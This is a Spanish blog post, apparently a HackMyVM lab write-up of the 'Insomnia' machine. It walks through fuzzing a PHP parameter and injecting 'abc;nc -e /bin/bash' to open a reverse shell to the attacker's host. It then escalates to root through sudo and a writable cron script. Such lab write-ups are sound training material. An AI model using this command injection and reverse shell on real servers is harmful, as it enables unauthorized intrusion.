+++
title = "Insomnia"
date = 2024-02-07T19:41:10-06:00
summary="Another machine by sml"
draft=false
tags=["pentesting","hackmyvm","easy","RCE","php","fuzzing"]
series=["Hackmyvm Fácil"]
series_order=5
+++
## Prefacio
Recién empece clases otra vez, entonces lo mas probable es que la pagina se actualice de manera irregular, en la sección de maquina por lo menos. Nuevamente, si estas leyendo esto, muchas gracias por tu tiempo.

## Información de la maquina
| Nombre      | Insomnia                                                         | 
| ---------- | ---------------------------------------------------------------- |
|Sistema Operativo|Linux|
| Autor     | alienum                                                                 |
| Sitio      | [hackmyvm](https://hackmyvm.eu/machines/machine.php?vm=Insomnia) |
| Dificultad | Fácil                                                                 |

## Reconocimiento y enumeración

Corremos nuestro escaneo de NMAP:

![](imagenes/Pasted%20image%2020240207195749.png)

**Nota: Se me corto la energía eléctrica cuando esta tratando de resolver esta maquina y me toco reañadirla a virtualbox para que trabajara bien nuevamente, entonces, en vez de .24 al final de la dirección IP, ahora verán .25.**

Revisemos la pagina web:

![](imagenes/Pasted%20image%2020240207201941.png)

Un chat, revisemos el código fuente:

![](imagenes/Pasted%20image%2020240207202031.png)

Tenemos un script de *javascript* que es el que corre la sesión de chat, tal vez podamos hacer *XSS* en esta pagina, pero antes que nada, intentemos enumerar la pagina web.

![](imagenes/Pasted%20image%2020240207202806.png)

Interesante, revisemos cada uno de esos archivos en la pagina web:

### chat.txt

![](imagenes/Pasted%20image%2020240207202846.png)

Un registro del chat, sigamos revisando.

### administration.php

![](imagenes/Pasted%20image%2020240207203031.png)

Parece ser que podemos **llamar** un archivo aquí, pero, no sabemos el nombre de la variable que el script php esta usando, entonces, vamos a hacer fuzzing con gobuster and y encontrar el nombre de variable correcto con este comando: `gobuster fuzz -u http://192.168.25.25:8080/administration.php?FUZZ=prueba -w /usr/share/seclists/Discovery/Web-Content/common.txt --exclude-length 65
`
![](imagenes/Pasted%20image%2020240207203709.png)

Bien, encontramos el nombre de variable, revisemos la pagina:

![](imagenes/Pasted%20image%2020240207203848.png)

Eso es bueno, aquí podemos ver el mensaje que escribimos antes, probemos a ver si podemos ejecutar algún comando.

![](imagenes/Pasted%20image%2020240207204758.png)

No sabemos específicamente que hace el script PHP, podemos suponer que usa un `cat <archivo>` con la función `system("cmd")` o algo asi. Ahora, intentemos el siguiente comando a ver si podemos obtener una reverse shell en nuestra maquina: `abc;nc -e /bin/bash 192.168.25.5 4444`

## Acceso inicial

![](imagenes/Pasted%20image%2020240207205056.png)

Ahi esta, primero lo primero, mejoremos nuestra shell:

![](imagenes/Pasted%20image%2020240207205301.png)

Encontramos la bandera de usuario, ahora veamos como podemos cambiar a otro usuario, o si es posible escalar privilegios:

![](imagenes/Pasted%20image%2020240207205430.png)

Interesante, veamos que hace el script:

![](imagenes/Pasted%20image%2020240207205615.png)

Revisando la pagina de ayuda:

![](imagenes/Pasted%20image%2020240207205629.png)

Este comando inicia un servidor web en el puerto 8080, pero, lo hace via la `terminal bash`, entonces, tal vez podemos reemplazar los contenidos y ejecutar una shell bash, con los privilegios del usuario `julia`.

***
### Nota: Resolución de problemas
En este punto, no podia editar el archivo con `echo` y obtenía el siguiente error `bash: echo: write error: No space left on device`, entonces, para arreglar ese problema, me toco *redimensionar el disco virtual de la maquina* para que funcionara otra vez, por favor tener en cuenta que, si hacen esto cuando la maquina ha corrido otra vez, la pueden romper.En mi caso, simplemente no me mostraba la pagina web, por lo cual les tocara importar la maquina otra vez. Entonces, si estas siguiendo este writeup, **te recomiendo redimensionar el disco virtual de esta maquina de antemano. Ahora, sigamos**.
***
![](imagenes/Pasted%20image%2020240207212415.png)

Bien, revisemos el script otra vez:

![](imagenes/Pasted%20image%2020240207212447.png)

Ahora, intentemos correrlo como el usuario `julia` usando `sudo -u julia /bin/bash /var/www/html/start.sh`:

## Escalada de privilegios

![](imagenes/Pasted%20image%2020240207212742.png)

Entramos como `julia`, veamos que podemos hacer:

![](imagenes/Pasted%20image%2020240207212912.png)

Encuentro este script de interés en `/etc/crontab`, revisemos que es lo que hace:

![](imagenes/Pasted%20image%2020240207213059.png)

Parece ser que todo lo que hace es revisar si algún tipo de servicio esta activo, y si no esta corriendo, lo inicia. Revisemos los privilegios de este archivo:

![](imagenes/Pasted%20image%2020240207213159.png)

Lotería, editemos este archivo con una payload, para que envié una sesión con privilegios de administrador a nuestra maquina:

![](imagenes/Pasted%20image%2020240207213436.png)

![](imagenes/Pasted%20image%2020240207213614.png)

En lo que ingresamos este comando, deberíamos obtener esto en nuestro escucha de netcat:

![](imagenes/Pasted%20image%2020240207213651.png)

Obtenemos privilegios de administrador, obtengamos la bandera de root, y terminemos de comprometer esta maquina:

![](imagenes/Pasted%20image%2020240207213853.png)

¡Gracias por tu tiempo y buena suerte en futuras maquinas!

## Cosas que aprendí de esta maquina
- Cuando me encuentre con un archivo `php`, intentar hacer fuzzing de variables, estas puede ser que llamen ciertos archivos a traves del script php, permitiéndonos hacer uso de un **remote command execution** para el acceso inicial.
- Redimensionar el tamaño del disco virtual de la maquina si me encuentro el error `bash: echo: write error: No space left on device` otra vez.